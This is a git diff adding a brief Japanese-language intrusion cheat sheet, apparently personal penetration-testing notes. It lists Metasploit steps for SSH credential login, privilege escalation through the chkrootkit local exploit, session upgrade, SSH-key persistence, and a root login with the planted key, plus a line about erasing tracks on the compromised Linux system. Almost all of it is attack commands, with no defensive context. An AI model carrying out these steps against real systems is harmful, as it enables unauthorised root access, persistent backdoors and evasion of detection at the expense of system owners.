@@ -1,0 +1,33 @@
+1) ping
+2) nmap
+3) msfconsole
+4) sshのクレデンシャルがある場合は以下のモジュールで行う
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS
+set USERNAME
+set PASSWORD
+exploit
+
+
+linuxシステムにアクセスできた場合は、linuxシステムのトラックを消去するプロセスを行う
+5) sessions -i 1
+6) chkrootkitがインストールされている場合には以下のコマンドで権限昇格を行う
+use exploit/unix/local/chkrootkit
+set SESSION 
+set CHKROOTKIT /bin/chkrootkit
+set LHOST
+exploit
+7) セッションをアップグレードする
+sessions -u 3
+8) 永続化には以下のモジュールを使用する
+use post/linux/manage/sshkey_persistence
+set SESSION
+set CREATESSHFOLDER true
+exploit
+→ssh秘密鍵を得る
+新しいターミナルで
+cat 秘密鍵
+cp ssh秘密鍵
+chmod 0400 ssh_key
+ssh -i ssh_key root@ターゲットドメイン
+
